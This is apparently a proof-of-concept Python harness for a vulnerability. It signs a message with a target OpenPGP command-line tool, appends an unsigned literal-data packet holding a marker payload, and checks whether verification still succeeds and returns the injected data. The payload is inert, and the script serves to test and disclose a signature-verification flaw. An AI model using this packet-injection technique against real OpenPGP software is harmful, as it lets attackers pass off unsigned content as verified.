#!/usr/bin/env python3
import argparse
import base64
import json
import subprocess
import sys
import tempfile
import time
from pathlib import Path


BASELINE_DATA = b"poc-baseline-data-3d91"
EMBEDDED_PAYLOAD = b"poc-embedded-payload-8a47"


def parse_args():
    parser = argparse.ArgumentParser(
        description="Report OpenPGP message-verification behavior for a target CLI."
    )
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=120.0)
    return parser.parse_args()


def run_command(command, timeout):
    started = time.perf_counter()
    try:
        completed = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
        runtime_ms = round((time.perf_counter() - started) * 1000)
        signal = -completed.returncode if completed.returncode < 0 else None
        return {
            "command": command,
            "returncode": completed.returncode,
            "signal": signal,
            "timed_out": False,
            "runtime_ms": runtime_ms,
            "stdout": completed.stdout,
            "stderr": completed.stderr,
        }
    except subprocess.TimeoutExpired as exc:
        runtime_ms = round((time.perf_counter() - started) * 1000)
        stdout = exc.stdout
        stderr = exc.stderr
        if isinstance(stdout, bytes):
            stdout = stdout.decode("utf-8", errors="replace")
        if isinstance(stderr, bytes):
            stderr = stderr.decode("utf-8", errors="replace")
        return {
            "command": command,
            "returncode": None,
            "signal": None,
            "timed_out": True,
            "runtime_ms": runtime_ms,
            "stdout": stdout if stdout is not None else "",
            "stderr": stderr if stderr is not None else "",
        }


def json_output(result, context):
    try:
        value = json.loads(result["stdout"])
    except (TypeError, json.JSONDecodeError) as exc:
        raise RuntimeError(f"{context} did not emit valid JSON: {exc}") from exc
    if result["timed_out"]:
        raise RuntimeError(f"{context} timed out")
    if result["returncode"] != 0:
        raise RuntimeError(f"{context} exited with status {result['returncode']}")
    return value


def decode_armored_message(path):
    lines = path.read_text(encoding="ascii").splitlines()
    body = []
    inside = False
    for line in lines:
        if line.startswith("-----BEGIN "):
            inside = True
            continue
        if line.startswith("-----END "):
            break
        if inside and line and not line.startswith("="):
            body.append(line)
    try:
        return base64.b64decode("".join(body), validate=True)
    except (ValueError, base64.binascii.Error) as exc:
        raise RuntimeError("baseline message contains invalid base64 armor") from exc


def new_format_packet(tag, body):
    length = len(body)
    if length < 192:
        header = bytes((0xC0 | tag, length))
    elif length <= 8383:
        header = bytes((0xC0 | tag, 192 + (length >> 8), length & 0xFF))
    else:
        header = bytes((0xC0 | tag, 255)) + length.to_bytes(4, "big")
    return header + body


def armor_crc24(data):
    crc = 0xB704CE
    for byte in data:
        crc ^= byte << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x1864CFB
            crc &= 0xFFFFFF
    return crc.to_bytes(3, "big")


def armor_message(data):
    encoded = base64.b64encode(data).decode("ascii")
    body = "\n".join(encoded[index : index + 64] for index in range(0, len(encoded), 64))
    checksum = base64.b64encode(armor_crc24(data)).decode("ascii")
    return f"-----BEGIN PGP MESSAGE-----\n\n{body}\n={checksum}\n-----END PGP MESSAGE-----\n"


def build_crafted_message(baseline_path, output_path):
    baseline_packets = decode_armored_message(baseline_path)
    literal_body = b"b\x00" + EMBEDDED_PAYLOAD
    payload_packet = new_format_packet(11, literal_body)
    output_path.write_text(
        armor_message(baseline_packets + payload_packet), encoding="ascii"
    )


def decode_data_text(data_b64):
    try:
        return base64.b64decode(data_b64, validate=True).decode("utf-8")
    except (ValueError, UnicodeDecodeError, base64.binascii.Error) as exc:
        raise RuntimeError("verification output contains invalid UTF-8 data") from exc


def collect_evidence(binary, timeout):
    with tempfile.TemporaryDirectory(prefix="openpgp-poc-") as temporary:
        directory = Path(temporary)
        baseline_data_path = directory / "baseline-data.bin"
        baseline_message_path = directory / "baseline.asc"
        crafted_message_path = directory / "crafted.asc"
        private_key_path = directory / "baseline-private.asc"
        public_key_path = directory / "baseline-public.asc"

        baseline_data_path.write_bytes(BASELINE_DATA)

        keygen = run_command(
            [binary, "keygen", "--out-dir", str(directory), "--name", "baseline"],
            timeout,
        )
        keygen_output = json_output(keygen, "keygen")
        if not keygen_output.get("ok"):
            raise RuntimeError("keygen did not report success")

        sign = run_command(
            [
                binary,
                "sign",
                "--key",
                str(private_key_path),
                "--data",
                str(baseline_data_path),
                "--out",
                str(baseline_message_path),
            ],
            timeout,
        )
        sign_output = json_output(sign, "sign")
        if not sign_output.get("ok"):
            raise RuntimeError("sign did not report success")

        build_crafted_message(baseline_message_path, crafted_message_path)

        baseline_verify = run_command(
            [
                binary,
                "verify",
                "--message",
                str(baseline_message_path),
                "--key",
                str(public_key_path),
            ],
            timeout,
        )
        baseline_output = json_output(baseline_verify, "baseline verification")
        baseline_data = baseline_output.get("data")
        if not isinstance(baseline_data, dict) or not isinstance(
            baseline_data.get("b64"), str
        ):
            raise RuntimeError("baseline verification omitted data.b64")

        crafted_command = [
            binary,
            "verify",
            "--message",
            str(crafted_message_path),
            "--key",
            str(public_key_path),
        ]
        crafted_verify = run_command(crafted_command, timeout)
        crafted_output = json_output(crafted_verify, "crafted verification")
        crafted_data = crafted_output.get("data")
        if not isinstance(crafted_data, dict) or not isinstance(
            crafted_data.get("b64"), str
        ):
            raise RuntimeError("crafted verification omitted data.b64")

        baseline_data_b64 = baseline_data["b64"]
        data_b64 = crafted_data["b64"]
        payload_b64 = base64.b64encode(EMBEDDED_PAYLOAD).decode("ascii")

        observable = {
            "verified": crafted_output.get("verified") is True,
            "data_b64": data_b64,
            "data_text": decode_data_text(data_b64),
            "baseline_verified": baseline_output.get("verified") is True,
            "baseline_data_b64": baseline_data_b64,
            "baseline_data_text": decode_data_text(baseline_data_b64),
            "payload_b64": payload_b64,
            "payload_text": EMBEDDED_PAYLOAD.decode("utf-8"),
        }

        if not observable["baseline_verified"]:
            raise RuntimeError("baseline verification did not succeed")
        if not observable["verified"]:
            raise RuntimeError("crafted verification did not succeed")

        return crafted_verify, observable


def main():
    args = parse_args()
    primary = {
        "command": [],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": None,
        "stdout": "",
        "stderr": "",
    }
    observable = None
    error = None

    try:
        if args.timeout <= 0:
            raise ValueError("--timeout must be positive")
        primary, observable = collect_evidence(args.binary, args.timeout)
    except Exception as exc:
        error = str(exc)[:300]

    result = {
        "binary": args.binary,
        "command": primary["command"],
        "returncode": primary["returncode"],
        "signal": primary["signal"],
        "timed_out": primary["timed_out"],
        "runtime_ms": primary["runtime_ms"],
        "stdout": primary["stdout"],
        "stderr": primary["stderr"],
        "observable": {
            "kind": "custom",
            "value": json.dumps(
                observable,
                separators=(",", ":"),
                ensure_ascii=False,
            )
            if observable is not None
            else None,
            "path": None,
        },
        "error": error,
    }

    serialized = json.dumps(result, ensure_ascii=False)
    if args.json_out:
        try:
            output_path = Path(args.json_out)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            output_path.write_text(serialized + "\n", encoding="utf-8")
        except OSError as exc:
            error = f"could not write --json-out: {exc}"[:300]
            result["error"] = error
            serialized = json.dumps(result, ensure_ascii=False)
    print(serialized)
    return 1 if error is not None else 0


if __name__ == "__main__":
    sys.exit(main())
